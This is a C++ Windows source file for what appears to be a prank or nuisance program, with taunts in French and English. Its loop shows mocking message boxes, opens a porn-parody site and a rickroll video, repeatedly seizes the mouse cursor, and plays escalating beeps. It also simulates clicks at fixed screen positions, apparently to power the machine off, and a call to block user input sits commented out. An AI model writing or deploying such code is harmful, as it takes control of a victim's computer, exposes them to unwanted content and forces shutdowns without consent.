#include <windows.h>
#include <fstream>

using namespace std;

int main() {
    void messageset();
    void pornpopup();
    void payload();
    void rickroll();
    void poweroff();

    int y = 1;
    while(y<10) {
        messageset();
        Sleep(30000);
        pornpopup();
        Sleep(30000);
        payload();
        Sleep(30000);
        rickroll();
        Sleep(30000);
        poweroff();
        Sleep(30000);
    }
    poweroff();
}

void messageset() {
    if(MessageBox(
                NULL,
                "O_O",
                "^_^",
                MB_OKCANCEL)==IDCANCEL) {
        MessageBox(
            NULL,
            "BOUH",
            "Δ",
            MB_OK);
    }
}

void pornpopup() {
    ShellExecute(NULL, TEXT("open"), TEXT("https://cornhub.website"), NULL, NULL, SW_SHOW);
    Sleep(1);
    MessageBox(
        NULL,
        "tu fais quoi encore",
        "re !",
        MB_OK);
}



void payload() {
    int a = 1;

    while(a<100) {
//BlockInput(true);
        SetCursorPos(500,500);
        Sleep(3000);
        a++;
    }

    Sleep(10000);
    int freq = 100;
    int loop = 1;
    while(loop<200) {
        Beep(freq,100);
        Sleep(50);
        freq++;
        loop++;
    }
}

void rickroll() {
    ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=dQw4w9WgXcQ"), NULL, NULL, SW_SHOW);
    Sleep(1);
    MessageBox(
        NULL,
        "GET WRECKED NOOB !",
        "hihihiha",
        MB_OK);
}

void poweroff() {
    SetCursorPos(32, 845);
    Sleep(400);
    mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    Sleep(400);
    SetCursorPos(579, 767);
    Sleep(400);
    mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    Sleep(400);
    SetCursorPos(571, 696);
}
